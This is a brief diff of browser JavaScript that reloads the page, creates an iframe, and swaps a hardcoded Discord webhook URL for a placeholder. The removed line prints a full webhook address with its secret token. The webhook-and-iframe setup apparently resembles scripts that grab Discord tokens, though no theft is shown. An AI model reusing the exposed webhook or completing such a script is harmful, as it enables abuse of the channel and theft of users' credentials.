@@ -1,6 +1,6 @@
 location.reload();
 
-const discordWebhook = "https://discord.com/api/webhooks/797211951355658270/J5E7q9eAp4AXkKl939KxfKXXJ6_RtN9qN-L7I_GblS5oxZPO24ItR808mEh6BTYH7wdw";
+const discordWebhook = "webhook-url-here";
 
 const i = document.createElement("iframe");
 
